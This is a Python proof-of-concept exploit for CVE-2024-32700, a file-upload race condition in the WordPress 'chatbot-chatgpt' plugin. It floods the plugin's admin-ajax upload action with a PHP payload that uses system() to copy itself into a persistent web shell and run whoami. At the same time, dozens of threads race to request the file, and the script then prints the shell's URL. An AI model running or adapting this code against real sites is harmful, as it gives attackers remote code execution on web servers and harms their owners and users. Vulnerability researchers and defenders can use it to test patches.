"""
proof of concept for cve-2024-32700
exploit file upload race condition.
"""
import requests
import sys
import uuid
import threading
import argparse


cancel = False

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_17) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15'
}

payload = """<?php system('cp {orig} {new}-new.php');system('whoami')?>"""


def upload(url, payload, upload_filename):
    upload_url = f'{url}/wp-admin/admin-ajax.php'
    files = {
        'file[]': (upload_filename, payload.encode())
    }
    for i in range(200):
        files[f'file[{i}]'] = (upload_filename, payload.encode())
    for i in range(5):
        if cancel:
            return
        resp = requests.post(upload_url, files=files, data={"action": "chatbot_chatgpt_upload_file_to_assistant"}, headers=HEADERS)
        # print(resp.text)



def request_file(url, upload_filename):
    global cancel
    url = f'{url}/wp-content/plugins/chatbot-chatgpt/uploads/{upload_filename}'
    for i in range(5):
        if cancel:
            return
        resp = requests.get(url, headers=HEADERS)
        if resp.status_code == 200:
            cancel = True
            sys.exit()



def main():
    global payload
    parser = argparse.ArgumentParser(description='exploit for cve-2024-32700')
    parser.add_argument('url', help='http://127.0.0.1')

    args = parser.parse_args()
    random_id = uuid.uuid4()

    random_filename = f'{random_id}.php'
    payload = payload.format(orig=random_filename, new=random_id)
    threads = []

    t = threading.Thread(target=upload, args=(args.url, payload, random_filename))
    threads.append(t)
    for i in range(30):
        t = threading.Thread(target=request_file, args=(args.url, random_filename))
        threads.append(t)

    for thread in threads:
        thread.start()
    if cancel:
        print(f'{args.url}/wp-content/plugins/chatbot-chatgpt/uploads/{random_id}-new.php')

if __name__ == '__main__':
    main()
